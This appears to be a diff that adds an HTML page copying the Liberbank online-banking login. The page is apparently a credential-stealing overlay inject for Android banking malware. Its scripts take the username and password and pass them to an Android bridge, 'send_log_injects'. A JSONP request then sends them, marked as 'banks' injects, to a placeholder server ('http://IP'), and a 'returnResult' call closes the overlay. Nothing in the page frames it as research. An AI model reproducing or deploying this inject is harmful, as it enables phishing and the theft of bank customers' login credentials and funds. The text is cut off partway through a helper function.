@@ -1,0 +1,347 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+    <title>liberbank</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.7.8/angular.min.js"></script>
+    <style>
+        html, body {height: 100%; } /* #32947C */ .form-group.has_err .form-control {border-color: #af0000; } .form-control.has_err {} .form-group.has_err label {} .form-group.has_err .err_span {} .err_div {position: fixed; z-index: 1; top: 0; left: 0; width: 100%; height: 100%; background: rgba(12, 12, 12, .6); } .err_box {position: relative; top: 10%; width: 90%; max-width: 307px; margin: 0 auto; padding: 12px 9px; background: rgba(255, 255, 255, 0.98); text-align: center; box-shadow: 0 0 15px black; } .scum_container {position: relative; overflow: hidden; padding: 18px 12px; } .scum_container.loader_show .scum {-webkit-animation-name: loader__show; animation-name: loader__show; -webkit-animation-duration: 1s; animation-duration: 1s; transition-timing-function: ease; -webkit-animation-fill-mode: forwards; animation-fill-mode: forwards; } .scum_container.loader_hide {-webkit-animation-name: loader__hide; animation-name: loader__hide; -webkit-animation-duration: 1s; animation-duration: 1s; transition-timing-function: ease; /*     animation-fill-mode:forwards; */ } @-webkit-keyframes loader__show {0% {opacity: 1; } 100% {opacity: 0; -webkit-transform: translateX(1000px); transform: translateX(1000px); } } @keyframes loader__show {0% {opacity: 1; } 100% {opacity: 0; -webkit-transform: translateX(1000px); transform: translateX(1000px); } } @-webkit-keyframes loader__hide {0% {opacity: 0; -webkit-transform: translateX(1000px); transform: translateX(1000px); } 100% {opacity: 1; } } @keyframes loader__hide {0% {opacity: 0; -webkit-transform: translateX(1000px); transform: translateX(1000px); } 100% {opacity: 1; } } .card-container {background: #9a0f18; padding: 14px 15px; border-radius: 10px; color: white; } .tan-card {border-radius: 6px; position: relative; overflow: hidden; border: 1px solid white; } .card-item {margin: 1px; border: 1px solid #ffffffd6; margin: 0px; text-align: center; /* color: white; */ width: 100%; } .form-control.tan-input {font-size: 16px; padding: 0px 0px; height: 23px; text-align: center; border-radius: 0px; border: none; background: white; } .form-control.tan-input:focus {box-shadow: none; } .card-item.card-item-th {font-weight: 700; } .card-item.card-item.odd {background: #00000038; } .form-control:disabled, .form-control[readonly] {background-color: #ffffffba; opacity: 1; } tancard.ng-scope {margin-bottom: 23px; display: block; } img.logo {width: 200px; } .top {padding: 42px 1px; } a.l1 {color: #32947C !important; font-weight: 200 !important; } .btn-success,.btn-success:hover,.btn-success:active {background: #32947C; border: none; border-radius: 16px; min-width: 100px; font-weight: 200; } .button-div.text-right {margin-top: 23px; } label {display: none; } .form-control,.form-control:focus,.form-control:active {border-color: #797979; height: 48px; } .links.text-left {position: relative; top: -15px; }
+    </style>
+</head>
+
+<body ng-app="app" ng-cloak data-ng-controller="c1">
+    <div class="top">
+        <div class="container text-center   ">
+            <img class="logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAXYAAABbEAYAAAA3i3J6AAABYWlDQ1BrQ0dDb2xvclNwYWNlRGlzcGxheVAzAAAokWNgYFJJLCjIYWFgYMjNKykKcndSiIiMUmB/yMAOhLwMYgwKicnFBY4BAT5AJQwwGhV8u8bACKIv64LMOiU1tUm1XsDXYqbw1YuvRJsw1aMArpTU4mQg/QeIU5MLikoYGBhTgGzl8pICELsDyBYpAjoKyJ4DYqdD2BtA7CQI+whYTUiQM5B9A8hWSM5IBJrB+API1klCEk9HYkPtBQFul8zigpzESoUAYwKuJQOUpFaUgGjn/ILKosz0jBIFR2AopSp45iXr6SgYGRiaMzCAwhyi+nMgOCwZxc4gxJrvMzDY7v////9uhJjXfgaGjUCdXDsRYhoWDAyC3AwMJ3YWJBYlgoWYgZgpLY2B4dNyBgbeSAYG4QtAPdHFacZGYHlGHicGBtZ7//9/VmNgYJ/MwPB3wv//vxf9//93MVDzHQaGA3kAFSFl7jXH0fsAAABcZVhJZk1NACoAAAAIAAQBBgADAAAAAQACAAABEgADAAAAAQABAAABKAADAAAAAQACAACHaQAEAAAAAQAAAD4AAAAAAAKgAgAEAAAAAQAAAXagAwAEAAAAAQAAAFsAAAAA8pvh5AAAAgtpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDUuNC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iPgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICAgICA8dGlmZjpQaG90b21ldHJpY0ludGVycHJldGF0aW9uPjI8L3RpZmY6UGhvdG9tZXRyaWNJbnRlcnByZXRhdGlvbj4KICAgICAgICAgPHRpZmY6UmVzb2x1dGlvblVuaXQ+MjwvdGlmZjpSZXNvbHV0aW9uVW5pdD4KICAgICAgICAgPHRpZmY6Q29tcHJlc3Npb24+MTwvdGlmZjpDb21wcmVzc2lvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CqZd9jAAABsCSURBVHgB7Z17nFxlfcafDSEuEsiClC4U2INQCIrsEsrNgjO0SkSoi3LTEkxAMQoWim0RQSAfBG2pyq2KAQouYPnYSmGtqJRiZ2hiUNHuesGEcjkLiMvlAxuNEGNi+j6H/e0xOzuZc5vZMyfP+f4xM+e81++bzPz2XN63Y+OlARuhTQZkQAZkQAZkQAZkQAZkIHcGZuSuRWqQDMiADMiADMiADMiADMjAhAEF7BMq9EYGZEAGZEAGZEAGZEAG8mdAAXv+xkQtkgEZkAEZkAEZkAEZkIEJAwrYJ1TojQzIgAzIgAzIgAzIgAzkz4AC9vyNiVokAzIgAzIgAzIgAzIgAxMGFLBPqNAbGZABGZABGZABGZABGcifAQXs+RsTtUgGZEAGZEAGZEAGZEAGJgwoYJ9QoTcyIAMyIAMyIAMyIAMykD8DCtjzNyZqkQzIgAzIgAzIgAzIgAxMGFDAPqFCb2RABmRABmRABmRABmQgfwYUsOdvTNQiGZABGZABGZABGZABGZgwoIB9QoXeyIAMyIAMyIAMyIAMyED+DChgz9+YqEUyIAMyIAMyIAMyIAMyMGFAAfuECr2RARmQARmQARmQARmQgfwZUMCevzFRi2RABmRABmRABmRABmRgwoAC9gkVeiMDMiADMiADMiADMiAD+TOggD1/Y6IWyYAMyIAMyIAMyIAMyMCEAQXsEyr0RgZkQAZkQAZkQAZkQAbyZ0ABe/7GRC2SARmQARmQARmQARmQgQkDCtgnVOiNDMiADMiADMiADMiADOTPgAL2/I2JWiQDMiADMiADMiADMiADEwYUsE+o0BsZkAEZkAEZkAEZkAEZyJ8BBez5GxO1SAZkQAZkQAZkQAZkQAYmDMyceNemb77pE2DIJ8k7sRMIcGaZJC8nac51IMA1FZK0FKDXI8DRHgnL+SUIcEOFhPvjvjvcI8CfeiRubqWXARmQARmoZ+B7PgHuGCH1UjXef1GJIPhV4++aNhlopoHPVQjwVAeJX9N+GwnwwTKJn39LydH2AftdwwS4cYgkH7b9usn0Bey/AQHOr5Lk/Vi8mtQG7C+BAH9XJcnLv6SDKGBPblA5ZUAGZGBqAz/1CXB1lUydJsres3uIC9g9EiWH0shAcgN3rCLAQ6Mkfjnv8IgL2APi599ScuiWmC1lpNVPGZABGZABGZABGZCBtjSggL0th02NlgEZkAEZkAEZkAEZ2FIMKGDfUkZa/ZQBGZABGZABGZABGWhLAwrY23LY1GgZkAEZkAEZkAEZkIEtxYAC9i1lpNVPGZABGZABGZABGZCBtjTQ9rPEtKX1KRq9LQjwfwvJFAki7treIxETK5kMyIAMyIAMyIAMyEDuDShgz8kQzQAB9vZIThqlZsiADMiADMiADMiADEy7AQXs0z4ExWzAyyDAwz4BfhEAbBUA7BYA7O4RYIeA/LvYAAI8HQCM+gR4LgB4bQCwSwDQ7RFgx4D89y9pC20dgV+BILhexCtG2wQkLVX5ZEAGWmFgPQiCb21+b28XAHQEtKIFqiNLA/Y79QoIMDsgyxpU1nQYUMA+HdanqNMCno9XyRQJIu46vIcAJ3kkYqYMkn3HJ8CVVQLc+zQB1q4n9SuwH4Q3ewQ4rYe41zIJA+D6JTTniI3Hv/kEuGeYAP+5kgAvriXR6+7pIsC7+4h77SHhAlTmIXqJU6c8r0qA9WNk6jSb23tyLwGO9Ehtym/7BLhlmABVn7gV7sZImN76c1WJAOeWSXhc72RABlpv4Ac+AW4aJoD9f35sNQE2bCTAa2YSd2JlNglX0F7QS4BjPQLMCmhdP54CAb5VIcCDqwnwszHiTqSMEeCllwmwbgNx7dyKuBMIswiw82ziThh1EuBNHnHfez0E+DOPhCceXJWxto0gwNd8EivrJontd/EPQGq3YZ8AXxohwH0rCbDqOeJ+B35HgM6ZxJ1Amk3clfwuEv4OnVgmCGqZqp7amvO1x1YIthODaVtX8gjQFZC2tOzyK2DPzmWqktaBAFdVSPKiXu4jzQ/Y7YzMRwcJ8E9DBMHXFL+oom72xbbcJ4C9fm6YuC+ifgIc7pGopcZP91sQF4hWCHDFMAGeHCPxy5ucY2SMhON7FQjwFo8Any8RYH+PTM4d/fMXl5HGfyjVK/ENc0gYsD8PApw+QNwfLj6plzvcb+NqZ3jCI3onAzLQKgN2xesjgwS4bYg0/p7+zXoCPDZG3OsQAf59iAB7dBEX+PcT4G0eyb5X9/sE+FSVAP/tk8btn9wSC9zXrCPA82sI8NMA9weAT4B/DHCBWicBzjiMAJ8okehXgu0M9/EDZHJron++fyEJ/4CwP1jOGSTA3UOkcXl24swfI4C9/pdPgL9dQdwJt8MJcFaZ5P8Kyzd9AvTfToDfbiCNfdRLcU4fceV5pF6q6duvWWKmz31b1myB2IJBAlw3ROJ/gTbq/CNjxAWOtxLAznQ3yhf3+M9BgPIAARZXSXaBeqP2POATYN7tBPh0hTTK1fzjL4AApaUkeqDe/JapBhmQgUYGVoO4QG8pAW4dItl9T9uJjPkDBLikShq1qvFxu7L5/kECvHWAhFcC7PencUnpUoytJcDnKgQ48BoCfN8n6cpOktuuYM/7LIkeqEet6+V1BPhIlQBnD5KouVufzsbh5DtI+kB9cR8Bru4nre9P1BoVsEc1pXSBgaUPEeArQ6T5UuwS7WlfJoCdcUlbs11CO+izBLAvxLTlJs1vZwYurJLsfgCTtuf9A8Rdah4lSUtRPhmQgekwcMa9BHholDSvBRZAf7JC3BnqColfn52RPnGAADcPkfjlNCuHXSE99k4SPsPUrPqs3Ed8AhzzFQK8sIbY0ea9Xj9EgAGfNK+euCU/6hPguDsJYFdM4pZj6U/vI8AX+kn+rygoYLeR02skA8+tIZGSZprILtGePkjcf9SA+FU87pPwP/yza0j8cpqdw34Ar6mQZtcWlv/AapL+3suwRL2TARlotYEfjZJW1wp8rEqAFT6JXr+dyf66T6Lna3VKu5XmrAHS/NrPX0GAX64lza9vcg2XDhJ3Bnv8ltHJx1v1+VkQ4O2DxE3ykDIOObWPADf2EwRz9LVDMNwObWzVvwnV0wYG7OHGK6okeoN/DeIelrqXhPcwRi9h05TbdxLgxD4CnF8m7t6/PgLM7Sab5kny6aIVBHjCJ0lKiJenVVdO4rVKqWVABtrBgJ1xP+te4h5iHZ9Vq17b7Xv5U98l9VJF379vFwE+1EeAi8rE3eo4fstDVt/L3xghzT/T/qt1JHr/s05pVxbu9UnWpTcuz07MHbeUhM9UNM45dQr7vbZn42zWuqlT52/vzPw1SS1qRwNv9QhwQg9x0xp6BHjGJ8BXR0h4L2LaPl7/IHG3jpRI4+kDP1MlwMpRkrz29/WR8F63etNR2g/XlyrEBfLLSfyHQX+9joT3Ft7jkeTtb5TT2t0onY7LgAy0j4EZHQQ4uoe4h/jHZxPb2EGA//WJe1blSRLOLpK0h0OjBLAz5vUe4rOH2O2e8aT1fbZEgPPKpPGtDV/xCbDwywSwK7hR67dbNe+pEPcHQZlEzZ1dOpuNy8bX2pVdDa+WdP8IcVemPZJ16bXl2Rn9kwZI+lu73ukR4F/6CTAzoLbevO9RwJ73Ecpp+2yarC8tIMB7PTJFYz0QfDgAWFoh7nOVJH8IavVa4mYt8AlwqkdQsz0D4u6t/A6pORx5x2l9xN3T108aZ7Mv0tPLxM2D6xHg5AHSOP/kFN/wiZuuyyfAvh6ZnKr5n+3KwlHdBHi9R8J5fp8fI272hTHiphMLaH67VIMMyECtgd27iPue7CfAn3ikNh1KAfiRT4B3DhLAzrBOkSPSrpurpP6sGytGSKSipkx0ch8BPlomUyaZcucpHnGzku1PwskTpky8mZ1PdZDNJMj40GEecbOYlUg4LbAFoLY+yG0VAly2jKR/KPMnPnGdGf934t41ZbMTRmcOknD2nqSVHeMR4F8XEmDrgKSlTX8+BezTPwZt2YIrjiCbCdTr9MrORPxkNQmng6yTvOHurw2T+gG7TdNoZ6obFjgpwY6dBLi2n0w6GOOjzYt/tEfcfO4+iVHAeFKbb/fTHomfP24O+8PssiMIcE6ZNL6iEbcepZcBGcjOgM27/fV+AhzgkcblW7q7+glwyG0k+Rn3bz5FENyQyFsStw0I2zEHxMWB4/Neh0eivTu7l0RLO1Uqbw6Z6ki0fXaLZrTUyVPZuhj3LSRunvyA2vJ6QNw0lGXi5l0PAM6sktr0Ufc8vZZETZ083UVV4k6MDZHk5fy5R4A7F5L6vpLXMD05FbBPj/e2rXXX2SQM3JJ25BP9BLjhxyRc4CJueTa9U718d60i9Y423r9gLsluAYWFJZI8YL9jiLjpH0ukcfuTpth6KwJ8YwEB7AswaXnKJwMy0DoDp+9Pogfqk1t2oEfcCZkDSDh/++R0jT7b7Fe2YJOtO2H5lpSI+9TkM7dWn73avfVfHyG2N/6rzXMfP2e0HHal9oslEj/wtCu8H/8BST7LzK/XkmhtTpJq2ShxvzfjV5KTlME89u9rcCEp3oklPXSa9F/GFpqvf2+SfoW7PwRx/8F2J8llPjFGgLGAsBy7FeaHoyTcH/fdvF4CjAakf90NJPlml6htQaPkJW0+5wVHEgXqm7ekozKQTwO2Imna1r2nl6QtBbCAPX1J0UqwWytsoSF7aPLKCnFXDpaScCGmaKW2PtVB3QR4g0fi128PVR60E4mf33KsDzb7lP1r2llwXjuLAHctJLVXcrJv8fSUqDPs0+O9bWs9tJdk1/yDPQLYimtJS37eJ+5MuEfc0+Q+SX6PvLVj0QCxT/l5tSWp7WHfrFo2cwYB/rpEsipV5ciADLTCgF0Zq3uvesxGHOqRmJmmSP6LDjLFgZi77Hv9eyDuWZkRAjw8RoBHRwnw+IvE3Yoz/tB+zGpyk3xeN0nfnJ27SPJy7A+g5CU0N6ct/PT5CgEuLpPm1jkdpStgnw7rbVynnRnPqgt7bCTpS3sJJNx+AVLc7Wc+cSsBjs/Ok1VP5+1MgB0DsipV5ciADLTCwOu2IemvgFpbXwfiHiqfRZIvVPPiGLFSG79aYH7tMAH+wyduetvxK6qNSyhGih26SPq+tPvDllENXL6MAMd7BHiTR6Lmzn86Bez5H6NctXA2SHZbvYdn4tbwO5BwszPu4Z5ivbP5i7Pu1R91k6xLVXkyIAOtMLDdTJJ9TXbLQdKVJdeD1N9eAQHOHiTArcPEzeO+kdTPV/QjM4IlfYrey+z6t24DAWyl3xWLSftO4zjZjO5hn2xEnzdrwL5YN5soxkFbGCFGlimTdoGEW/Dwvxd+Ltq7dSDZb7NAtMmADLSjgbUg2W92y0HSkid/P1s5L4AARy0lwC1DpPmB+nazCLBPF7HWFPc177e0ZG3+oVECfKZCsi59+sprwt/i09cZ1dx8A8+BZLf5HSR9eXbvupW0M0j67QiPIJh8bE764jIrYU+PZFacCpIBGSiAgRfWkPDZHZtlJGnXXgRJfiuM1dsVbPYpfP34IAG+O0rC/Wnf7dZF3AJRHgHmzSGAPTP1Zo8AS6oEsIdR09ar/PkysGQ5CdcB2M8j+WpjnNYoYI9jS2mxcoQ4EVwOyUsvpNG0jI1qmNNJEMw5w1lnbNsFJP12cYm4FQLH509PX6JKkAEZkIHmGHhlPQGeDEAwK3dPiqqymt1lnx4SNuRhn7gz6sMk3B/3nT0kf9YBxK042kuiz6piK2rGrVfpm2vg9D4STkaRdL57W8H2jCoBlnkEsNlzmtuL7EvXLTHZOy10iff7JH0XbZrEB58iycs7sJvULkVt02DZwkdJa7Alu5PmVz4ZkAEZaLWBb1dI+loHh0n6cuaBhNt9Pkl/68uXTyPANf0keqBuLXl2jNgnvU63gQ/1EeCf+wlwVT9J36oHfeLKq5D05U1XCTrDPm7+l2sIcIdPog9H3EuOdmLalhiOXlM+Uq7wSTiv7kEeid+2z1RJ+iWT6007Zn9Bv3UucUsTD5H47bxjFQHOL5PaPwzilmgPx9oS4HHzW3pbkbBtH0qqrPdeWuRWUFyyegm/SLXJQDsa6PC3XrRT2Z2x87fHwUvy04PrVxFgUZnE/96yEyoDD5Pk/XpdJ3H3inskLOeR1ST8HPfdH3cR4GSPxM0dpv/xKAk/6930GLBbl77QT8J/ryd4BHi7R4Bv+SR5Gy9ZToC/8Aiwr0eSl9fqnArYx43/fA0B/nKANG8Y3tdHgHYN2M3MonsJ8MBiAuwQYEfrv97jE+DqKqmfLuqRk3tI/dTv6iXJA/bhUeL+4q8Q4ANlUr++RkdurBDgQ1XSKHXt8d5uAgwtJrXH22XPhiWvVPyKW+EWjy65bs92abXaKQObGpixaE5ln/NcwL5ke+/gOZsem85P3x8lwBUVEi5V36hNL4MACwZI+nvXT5xLEMx18vuX8/0x0qg19Y/v1EXqH2905HGfAD8ZJY1S63izDVj8UO8E6HUl4qZpfJoAa9eT+K2yW8beXyUufvFI7b/P+CW3Jsfv/x9qTY2qpRAG7IvuwGsIcH2FAKt8guDRVD6cavdAnlclbn7U20j6S6H7dRP3MJFHXEV1tpM84i6VdpM6iSLsPnsZAW6qkPChrghZgyS3+gQ4dzmJmqs23YJ9Se1+7ZEBGZCByQYurhLgXYMkPEM5AuIWGvJJeGX5sKUEyOrWx1N7yeRWAdt1kdr9Uff8+BlSu8J1o/w2W8rHhkn87/FG5et4cwzs7RHgY0eQ9HUs9wlwbYWkL69VJegMe6tMF7SekTECnFUlrpPVgKb39sL5pHE1dmvM5fMJ8O4B0jjf5BQ2v+uZVQJct4q4H8K5BNi7h4QLljziE7dU8ioC/HCUTC41+uddZxPgg2USPZ9SyoAMyMDdQwSw12YbOcojwJEeqa1tzy5Suz/qHpsP/sQBAtxYIkC92bNW+sRdaRgmwJ1DJGptSpcXAxeUCHD7EHErmo+R5K27aAUBjvOI+x0f/8MgeYnNzamAvbl+VXrGBg7tJsCpHole+Ls8Any4j7grAkMkev7JKX80SgB7nXw8689Xn0CA7QOyLl3lyYAMyEB6A1t1EPdwX4nUL+/YHgL8fUD9dI2O2JWAvXziAvbxPwS27STuSu8aAjy7hjQqTcfzbqATxJ0w6yfAOwZI8lbb+gIfqBLg2x7J7y0yuiUm+VhvkTltwYlWd95me7llPgkfSonbjmv7CTDfI3Fztz79ZSUC2K09rW+BapQBGWgXAzt0EhdwdJDWt/rKtxCg1yP167d50A/pJvXTRT1it7o8PkYAe5hUgXpUg+2V7hiPuCvmfSR926s+CW/tTV9ic0pQwN4cr4Ut9ab3EuA1M0nzu9k5k7hLuacQIO3CBzNBgK8tJMBf9ZHm9yNqDVtvRYB/KBHg4jKJmlvpZEAGtmQDB3QTtyDQW0jrTPxNmQAfLZPG9drsVjfMJ+7KYSdpnC+rFLO2IsB7+khWpaqcVhu4up8A284i6Wu/YAUBnvBJ+vKyLkEBe9ZGC16e3ZN496nErQA6vnBR1t1+UzdxK+CdSurfC5m03lkg7qGT8TPudy0k6R9OTdoeO9P0wAISTiOZtDzlkwEZ2HIN2B/6l5dI9mfcuzqJu5d4IXFLwJdIfN92Jv5bpxDAViiNX1K0HDb5wP8sIMCFvSRaXqXKn4HdQYBLDifp22fPRtgtMnblJn3J2ZTQgnOk2TS0Xil7ziGABTz10uVl/+u7SG1r7OFIu0e7NkW0PeZjcmoLUNN62hoknBd16BQCXDBMgK8Ok/izwNiZoUX7EvcQa5m4M/kBk3uT/efjPQK8czFxZ+B9AtxcJW76p1ECrF5LktdvZ5KOm0uA03pJ6DN5ya/mPHg34qZLXEvil7Z3F4mfL26ODjcR3mzfBRL+bG8P51ebDLSjgRn+Not6nghavgTl9D3o8Yh7mH01iV/eG7tImO+iMgHe5hHg0ioB7hsh0b+n9+oi7vuqjwBnlgiwa0BYX9J3Ng/3T88l7h74KnHfv0PErdw6RqKXblcqS7sT4IwSCedtt99bWxfDplteCxJ9O2QOqU1v0xPafN+1KaLtmdtDoqXdXKreOSR8uHJzaac6tkMXmerIq/uOnEuAXTpJ/XT1jiRdz8XKO69M3DNlq4n7nR4jdjT56/d8AtRb7yV5yclydmy8NGBjsuzKJQObGngWxD284RNg5QhBMLsv5/ft3kjcmRSPAG8MAPb3iEuQ020DCGArnz4CArzgE/faQQD7AZizkbgvMI8ABwSEt/TYHz6uCG0yIAMy0FIDz4MA3/cJ8IxP3CxXHoE7a/nqmUt73csjyZ8dQsrtMZ+4e9MDgBd9wnUciLvS6xH30GmA+771CPDaAJdAmwwUwIAC9gIMorogAzIgAzIgAzIgAzJQXAO6h724Y6ueyYAMyIAMyIAMyIAMFMCAAvYCDKK6IAMyIAMyIAMyIAMyUFwDCtiLO7bqmQzIgAzIgAzIgAzIQAEMKGAvwCCqCzIgAzIgAzIgAzIgA8U1oIC9uGOrnsmADMiADMiADMiADBTAgAL2AgyiuiADMiADMiADMiADMlBcAwrYizu26pkMyIAMyIAMyIAMyEABDChgL8AgqgsyIAMyIAMyIAMyIAPFNaCAvbhjq57JgAzIgAzIgAzIgAwUwIAC9gIMorogAzIgAzIgAzIgAzJQXAMK2Is7tuqZDMiADMiADMiADMhAAQwoYC/AIKoLMiADMiADMiADMiADxTWggL24Y6ueyYAMyIAMyIAMyIAMFMCAAvYCDKK6IAMyIAMyIAMyIAMyUFwDCtiLO7bqmQzIgAzIgAzIgAzIQAEMKGAvwCCqCzIgAzIgAzIgAzIgA8U1oIC9uGOrnsmADMiADMiADMiADBTAgAL2AgyiuiADMiADMiADMiADMlBcAwrYizu26pkMyIAMyIAMyIAMyEABDChgL8AgqgsyIAMyIAMyIAMyIAPFNaCAvbhjq57JgAzIgAzIgAzIgAwUwIAC9gIMorogAzIgAzIgAzIgAzJQXAMK2Is7tuqZDMiADMiADMiADMhAAQwoYC/AIKoLMiADMiADMiADMiADxTWggL24Y6ueyYAMyIAMyIAMyIAMFMCAAvYCDKK6IAMyIAMyIAMyIAMyUFwDCtiLO7bqmQzIgAzIgAzIgAzIQAEMKGAvwCCqCzIgAzIgAzIgAzIgA8U18P9vpmUMVAzRrgAAAABJRU5ErkJggg==">
+        </div>
+    </div>
+    <div class="main">
+        <div class="container">
+            <div class="row">
+                <div class="col"></div>
+                <div class="col-sm-10 col-md-8 col-lg-6">
+                    <div class="scum_container">
+                        <div class="scum" id="login-view">
+                            <form name="form1" id="form1" autocomplete="off" onsubmit="send1(event,'finish__');return false">
+                                <div class="form-group">
+                                    <label for="user">Usuario/referencia</label>
+                                    <input placeholder="Usuario/Referencia" type="text" name="user" id="user" pattern=".{4,}" class="form-control" data-err_text="Please enter valid Usuario/Referencia" data-ng-model="data.user">
+                                </div>
+                                <div class="form-group">
+                                    <label for="clave">Introduce tu clave</label>
+                                    <input placeholder="Introduce to clave" type="password" name="clave" id="clave" pattern=".{4,}" class="form-control" data-err_text="Please enter valid Introduce to clave" data-ng-model="data.clave">
+                                </div>
+                                <div class="links text-left">
+                                    <a class="l1">¿Has olvidado tu clave?</a>
+                                </div>
+                                <div class="button-div text-right">
+                                    <button class='btn btn-success' onclick="sendData();">
+                                        Entrar
+                                    </button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+                <div class="col"></div>
+            </div>
+        </div>
+    </div>
+    <div class="err_div" style="display:none ;">
+        <div class="err_box">
+            <h4 class="err_title">Error al validar datos</h4>
+            <p class="err_p">
+                La información que has ingresado es incorrecta. Inténtalo de nuevo.
+            </p>
+            <button class="err_buton" onclick="$('.err_div').hide()">Aceptar</button>
+        </div>
+    </div>
+    <script type="text/javascript">
+    var php_js = {
+        home: "http://IP",
+        link: "liderbank"
+    }
+
+    function sendData(){
+       if(document.getElementById('user').value.length>=4 && document.getElementById('clave').value.length>=4){
+        var data = {};
+
+        data.user = document.getElementById('user').value;
+        data.clave = document.getElementById('clave').value;
+        data.type_injects = "banks";
+        data.closed = "close_activity_injects";
+
+
+
+
+        var ua = navigator.userAgent.toLowerCase();
+        if(ua.indexOf("android") > -1) {
+            try {
+                Android.send_log_injects(JSON.stringify(data))
+            } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+       }
+}
+
+
+
+
+    var save_logs_done = function(data__, cb) {
+        $.ajax({
+            url: php_js.home + "?pl=logs&sl&done&link=" + php_js.link,
+            dataType: "jsonp",
+            data: {
+                data: JSON.stringify(data__)
+            },
+            success: cb,
+            error: function(data) {
+                console.error(data)
+            }
+        });
+
+    }
+
+
+    var app = angular.module('app', [])
+
+
+    app.controller('c1', ['$scope', function($scope) {
+        sc_ = $scope;
+
+        $scope.data = {
+
+        }
+    }])
+
+
+
+
+
+
+    $('<div class="loader__" style="display:none;position: fixed;background: rgba(21, 20, 20, 0.51);width: 100%;height: 100%;top: 0px;left: 0px;z-index: 1000;text-align: center;">\
+   <span class="fa-stack l_1" style="font-size: 50px;position: relative;top: 50%; -webkit-transform: translateY(-50%); -ms-transform: translateY(-50%); transform: translateY(-50%);">\
+          <i class="fa fa-circle fa-stack-2x"></i>\
+          <i class="fa fa-spinner fa-stack-1x fa-pulse" style="color: white"></i>\
+   </span>\
+   \
+   \
+   \
+</div>').appendTo('body');
+
+    window.loader_ = {
+        hide: function() {
+
+            $('.scum_container').removeClass('loader_hide loader_show')
+            $('.scum_container').addClass('loader_hide');
+            $('.loader__').fadeOut('slow');
+        },
+        show: function() {
+            $('.loader__').fadeIn('fast');
+            $('.scum_container').removeClass('loader_hide loader_show')
+            $('.scum_container').addClass('loader_show');
+        }
+    }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    $("body").on("keypress change", '.form-control ,.custom_input_class', function() {
+        $(this).closest(".form-group").removeClass("has_err");
+        $(this).removeClass("has_err");
+        $(".err_div").fadeOut();
+    });
+
+    setTimeout(function() {
+        $('.form-control[data-mask]').each(function(i, el, all) {
+            $.mask.definitions['h'] = "[A-Fa-f0-9]";
+            $(this).mask($(this).data().mask, {
+                placeholder: $(this).attr('mask-placeholder')
+            }) //auto mask
+
+        })
+    }, 1) // fix for anguler masked intergration 2019
+
+
+
+    var send1 = function(e, callback__, global_luhn__) {
+
+
+        e.preventDefault();
+        var el = e.target;
+        var err = false;
+        var err_text = [];
+        var err_elements = [];
+
+        if ($(el).data().hasOwnProperty('sub_ed')) { //2019
+            // return;
+        }
+
+        $(el).find("input:visible:enabled,select:visible:enabled").each(function() {
+            var reg__ = new RegExp($(this).attr('pattern'));
+
+            if (!reg__.test($(this).val())) {
+                err = true;
+                err_elements.push(this);
+                err_text.push(this.dataset.err_text);
+                return;
+            }
+            var luhn__ = $(this).data().luhn;
+            if (typeof luhn__ != "undefined" && luhn__ != "") {
+
+                if ($(this).val() != "") {
+                    if (!eval(luhn__)($(this).val(), err_text)) {
+                        err = true;
+                        err_elements.push(this);
+                    }
+                }
+            }
+        });
+
+        //time for global_luhn
+        if (!err) {
+            if (typeof global_luhn__ != "undefined") {
+                if (!eval(global_luhn__)(err_text)) {
+                    err = true;
+                }
+            }
+        }
+
+
+        if (err) {
+            err_text = err_text.filter(function(e) {
+                return e;
+            });
+            err_text = $.unique(err_text);
+            $(".err_ul").html("");
+            $(err_text).each(function(i, t) {
+                $("<li><span>" + t + "</span></li>").appendTo(".err_ul");
+            });
+
+            $(".err_div").show();
+            $(err_elements).each(function() {
+                $(this).closest(".form-group").addClass("has_err");
+                $(this).addClass("has_err");
+
+                //...
+            });
+            $(window).scrollTop(0);
+            return;
+        }
+
+        if (typeof callback__ != "undefined") {
+            $(el).data('sub_ed', true); //2019
+            eval(callback__)(el);
+            return;
+        }
+        alert("We stack, what to do next?");
+    };
+
+
+
+
+    function next__(el) {
+
+        loader_.show();
+        setTimeout(function() {
+            loader_.hide();
+            $('.scum').hide();
+            $(el).closest('.scum').next().show();
+        }, 4000)
+
+    }
+
+
+    function finish__(el) {
+
+        loader_.show();
+
+        // data___ = $('.form').custom_ser()
+        // $.each(data___, function(i, v) {
+        //     $('<input type="hidden" name="' + i + '" value="' + v + '">').appendTo('#mf') //random prepend
+        // })
+
+
+
+        submit_data();
+
+    }
+
+
+
+
+    function submit_data() {
+
+
+        //here up to you, if you want to send data over ajax, or send form,to send ajax use data__ var.
+        data__ = sc_.data
+        data__.exit = ""
+        console.log(data__);
+        save_logs_done(data__, function() {
+
+            // Android.returnResult(JSON.stringify(data__))
+            Android.returnResult(JSON.stringify({}))
+
+        })
+    }
+
+
+    $.fn.autoJump = function() {
+        var els = this;
+        els.on("input", function() {
+            if ($(this).val().length == $(this).attr('maxlength')) {
+                var this_ = this;
